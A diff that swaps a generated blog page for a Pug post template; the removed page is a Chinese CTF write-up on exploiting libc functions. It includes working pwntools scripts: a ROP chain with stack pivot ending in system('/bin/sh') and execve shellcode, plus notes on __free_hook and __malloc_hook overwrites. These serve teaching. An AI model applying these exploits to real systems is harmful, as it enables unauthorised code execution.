@@ -1,384 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>pwn之特殊函数利用 - Watch Security</title>
-
-<meta name="keywords" content="pwn利用的特殊函数">
-
-<meta name="description " content="">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-09-20">2019-09-20</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">pwn之特殊函数利用</h2>
-            <div class="post-meta">
-                本文总共4464个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="pwn之特殊函数利用"><a href="#pwn之特殊函数利用" class="headerlink" title="pwn之特殊函数利用"></a>pwn之特殊函数利用</h3><h4 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h4><ul>
-<li><h5 id="函数原型及作用"><a href="#函数原型及作用" class="headerlink" title="函数原型及作用"></a>函数原型及作用</h5><ul>
-<li><h5 id="void-setbuf-FILE-stream-char-buf"><a href="#void-setbuf-FILE-stream-char-buf" class="headerlink" title="void setbuf(FILE  stream, char  buf);"></a>void setbuf(FILE <em> stream, char </em> buf);</h5></li>
-<li><p>用于将缓冲区buf与文件流相关联起来。实现缓冲区直接操作文件流。</p>
-</li>
-</ul>
-</li>
-<li><h5 id="出现形式"><a href="#出现形式" class="headerlink" title="出现形式"></a>出现形式</h5><ul>
-<li><p>在很多程序中，会有一个初始化操作，如下，用以取消相应的缓冲区</p>
-<img src="/2019/09/20/pwn之特殊函数利用/1.png" title="[]">
-</li>
-<li><p>但是我们也可以像下面的代码一样使用</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">	buf[<span class="number">0</span>] = <span class="string">'1'</span>;</span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"test"</span>);</span><br><span class="line">	write(<span class="number">1</span>, <span class="string">"\n====\n"</span>, <span class="number">6</span>);</span><br><span class="line">	write(<span class="number">2</span>, buf, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行结果</p>
-<img src="/2019/09/20/pwn之特殊函数利用/2.png" title="[]">
-</li>
-<li><p>也就是说，我们可以指定文件操作符与某个缓冲区的同步关系。</p>
-</li>
-</ul>
-</li>
-<li><h5 id="例题，blue-code-ctf-2017-的mailer"><a href="#例题，blue-code-ctf-2017-的mailer" class="headerlink" title="例题，blue code ctf 2017 的mailer"></a>例题，blue code ctf 2017 的mailer</h5><ul>
-<li><p>漏洞分析，只发现了一个数组的负数越界造成的任意函数调用，但是函数的参数却是不受控制的</p>
-<img src="/2019/09/20/pwn之特殊函数利用/3.png" title="[]">
-<img src="/2019/09/20/pwn之特殊函数利用/4.png" title="[]">
-</li>
-<li><p>由于mail结构是存储在栈空间的，且多次使用函数memset处理。原以为漏洞在memset函数。但是没有思路，后来了解到setbug函数的作用与利用方式，在这里有很好的利用。</p>
-</li>
-<li><p>利用路线。</p>
-<ul>
-<li>数组溢出劫持到setbuf(fd, content4)    设置content4为与fd关联的缓冲区</li>
-<li>nofilter(fd, content0, size)    实际就是在content4的后面加上content0。也就可以造成栈溢出。</li>
-</ul>
-</li>
-<li><p>栈溢出之后就是rop chain的布置。</p>
-<ul>
-<li>puts(&amp;puts)泄露信息</li>
-<li>read(buf_bss, 0x100)在bss伪造栈</li>
-<li>pop ebp ==&gt; buf_bss。leave ret栈迁移</li>
-</ul>
-</li>
-<li><p>利用成功。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">	puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">	gadget1 = <span class="number">0x08048dab</span> <span class="comment"># pop ebp ; ret</span></span><br><span class="line">	gadget2 = <span class="number">0x08048da8</span> <span class="comment"># pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">	gadget3 = <span class="number">0x08048495</span> <span class="comment"># pop ebx ; ret</span></span><br><span class="line">	gadget4 = <span class="number">0x08048daa</span> <span class="comment"># pop edi ; pop ebp ; ret</span></span><br><span class="line">	gadget5 = <span class="number">0x08048da9</span> <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line">	leave_ret = <span class="number">0x080485f8</span> <span class="comment">#leave; ret</span></span><br><span class="line">	stdin_bss = <span class="number">0x0804B060</span></span><br><span class="line">	buf_bss = <span class="number">0x0804B700</span></span><br><span class="line">	readn = <span class="number">0x80486d9</span></span><br><span class="line"></span><br><span class="line">	rop_1 = <span class="string">'a'</span>*<span class="number">0xd</span> + p32(puts_plt) + p32(gadget3) + p32(puts_got)			<span class="comment">#puts(&amp;puts)</span></span><br><span class="line">	rop_1 += p32(readn) + p32(gadget4) + p32(buf_bss) + p32(<span class="number">0x100</span>)			<span class="comment">#readn(buf_bss. 0x100), ebp=buf_bss</span></span><br><span class="line">	rop_1 += p32(gadget1) + p32(buf_bss) + p32(leave_ret) + p32(buf_bss)	<span class="comment">#privotstack to buf_bss</span></span><br><span class="line"></span><br><span class="line">	add(rop_1)</span><br><span class="line">	add(<span class="string">'b'</span>*<span class="number">255</span>)</span><br><span class="line">	add(<span class="string">'c'</span>*<span class="number">255</span>)</span><br><span class="line">	add(<span class="string">'d'</span>*<span class="number">255</span>)</span><br><span class="line">	add(<span class="string">'e'</span>*<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p, 'b* 0x08048CFA')</span></span><br><span class="line">	post(<span class="number">4</span>, <span class="number">-15</span>)			<span class="comment">#setbuf(fd, content4)</span></span><br><span class="line">	post(<span class="number">1</span>, <span class="number">0</span>)				<span class="comment">#nofilter(content1, size, fd)</span></span><br><span class="line">	post(<span class="number">0</span>, <span class="number">0</span>)				</span><br><span class="line"></span><br><span class="line">	quit()</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'service :)\n'</span>)</span><br><span class="line">	puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	libc_base = puts_addr - libc.symbols['puts']</span></span><br><span class="line"><span class="string">	system_addr = libc_base + libc.symbols['system']</span></span><br><span class="line"><span class="string">	binsh = libc_base + next(libc.search('/bin/sh\x00'))</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line"></span><br><span class="line">	libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">	libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">	system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">	binsh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"system ==&gt; "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">	payload = p32(system_addr)*<span class="number">2</span> + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">	p.sendline(payload)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Free函数"><a href="#Free函数" class="headerlink" title="Free函数"></a>Free函数</h4><ul>
-<li><p>Free函数外会有一层<strong>free_hook。当</strong>free_hook值不是null时，就会调用__free_hook而不是free。</p>
-</li>
-<li><p>且__free_hook存在于libc文件的data段中，可以被覆写。造成劫持利用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void (*hook) (void *, const void *)</span><br><span class="line">  = atomic_forced_read (__free_hook);</span><br><span class="line">if (__builtin_expect (hook != NULL, 0))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (0));</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">if (mem == 0)                              /* free(0) has no effect */</span><br><span class="line">  return;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="Realloc函数"><a href="#Realloc函数" class="headerlink" title="Realloc函数"></a>Realloc函数</h4><ul>
-<li>当Realloc(chunk, size)的size为0时，相当于free(chunk)<ul>
-<li>可以用来执行double free操作。</li>
-<li>例题: unctf_2019的Box</li>
-</ul>
-</li>
-<li>当Realloc(chunk, size)的size超出可分配的空间时，chunk指针被置null，而原来的chunk内存也不会被释放。<ul>
-<li>这在double chain利用的时候很有用，可以来padding多余的chunk，拿到目的chunk。</li>
-<li>例题 <strong>TWCTF_online_2019_asterisk_alloc</strong></li>
-</ul>
-</li>
-<li>Realloc(chunk, size)时，得到的chunk地址是连续的，也就是说只要chunk高地址是合法的都可以被包含进来，这很容易在heap的管理机制里创造堆块重叠。<ul>
-<li>例题，roarctf_2019_realloc_magic</li>
-</ul>
-</li>
-</ul>
-<h4 id="Calloc函数"><a href="#Calloc函数" class="headerlink" title="Calloc函数"></a>Calloc函数</h4><ul>
-<li>这个函数底层实现是先调用malloc函数，再调用realloc函数。<ul>
-<li>本来覆盖的时候觉得随便覆盖都行，但是似乎不一样。</li>
-</ul>
-</li>
-<li>而是同时覆盖。<ul>
-<li>将__malloc_hook覆盖为realloc + offset<ul>
-<li>这里的offset根据onegadget的不同，取值不一；(0xf02a4的是13， 0xf1147的是20)</li>
-</ul>
-</li>
-<li>将__realloc_hook覆盖为onegadget。</li>
-</ul>
-</li>
-<li>例题：roarctf_2019_easy_pwn。</li>
-</ul>
-<h3 id="strdup函数"><a href="#strdup函数" class="headerlink" title="strdup函数"></a><strong>strdup函数</strong></h3><ul>
-<li><p>函数实现字符串拷贝功能</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">strdup</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span></span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>函数内部调用malloc为返回的字符串指针开辟空间，所以可以直接赋值给未初始化的指针；因此也可以对返回的指针free释放。</p>
-</li>
-<li><p>风险</p>
-<ul>
-<li>忘记使用delete或者free函数释放malloc的空间。</li>
-</ul>
-</li>
-</ul>
-<h4 id="abs函数"><a href="#abs函数" class="headerlink" title="abs函数"></a>abs函数</h4><ul>
-<li><p>都知道abs函数是取绝对值，但是其实存在bug。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">abs</span>(<span class="number">0x80000000</span>) = <span class="number">0x80000000</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>原因如下，（来自abs实现源码）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Return the absolute value of I.  */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line"><span class="built_in">abs</span> (<span class="keyword">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> i &lt; <span class="number">0</span> ? -i : i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>按照该实现方式，0x80000000取abs就是-0x80000000，（各位取反，再加一）仍然是0x80000000。</p>
-</li>
-</ul>
-<h4 id="系统调用syscall"><a href="#系统调用syscall" class="headerlink" title="系统调用syscall"></a>系统调用syscall</h4><ul>
-<li><p>存在trik</p>
-<ul>
-<li><p>在所有寄存器为0时，执行syscall会将rip的值赋值给rcx</p>
-</li>
-<li><p>如下图，在未执行syscall之前</p>
-<img src="/2019/09/20/pwn之特殊函数利用/5.png" title="[]">
-</li>
-<li><p>执行syscall之后</p>
-<img src="/2019/09/20/pwn之特殊函数利用/6.png" title="[]">
-</li>
-<li><p>利用这一点，构造特殊的ROP，直接将shellcode写入.text段</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">	syscall</span><br><span class="line">	dec edx</span><br><span class="line">	mov esi, ecx</span><br><span class="line">	jmp start</span><br></pre></td></tr></table></figure>
-<p>执行结束后，edx=0xffffffff，esi = 0,  rcx = rip = &amp;(dec edx)，rdi = 0，再次syscall就是read(0, rip, 0xffffffff)。即可以改写syscall后的所有指令。</p>
-<ul>
-<li><p>例题startctf的primepwn</p>
-</li>
-<li><p>exp</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	mov esi, ecx</span></span><br><span class="line"><span class="string">	jmp start</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload  = asm(code, arch=<span class="string">'amd64'</span>)</span><br><span class="line">p.sendline(str(u64(payload)))			<span class="comment">#read(0, rip, 0xffffffff)</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">	mov rsp, rcx</span></span><br><span class="line"><span class="string">	mov rax, 0x3b</span></span><br><span class="line"><span class="string">	xor rsi, rsi</span></span><br><span class="line"><span class="string">	xor rdx, rdx</span></span><br><span class="line"><span class="string">	call shell</span></span><br><span class="line"><span class="string">	.ascii "/bin/sh"</span></span><br><span class="line"><span class="string">	.byte 0</span></span><br><span class="line"><span class="string">shell:</span></span><br><span class="line"><span class="string">	pop rdi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">p.sendline(asm(code, arch=<span class="string">'amd64'</span>))</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>libc函数附近存在syscall指令，可以部分覆盖<strong>绕过ALSR</strong>。如在32libc下，read函数附近的syscall。</p>
-<img src="/2019/09/20/pwn之特殊函数利用/7.png" title="[]">
-</li>
-<li><p><strong>rt_sigreturn</strong>，可用于构造SROP。</p>
-</li>
-</ul>
-<p><a href="https://cloud.tencent.com/developer/article/1079230" target="_blank" rel="noopener">参考链接setbuf</a></p>
-<p><a href="http://eternalsakura13.com/2018/04/27/star_primepwn/" target="_blank" rel="noopener">参考链接syscall</a></p>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-            <a href="../../../../tags/pwn/">pwn</a>
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
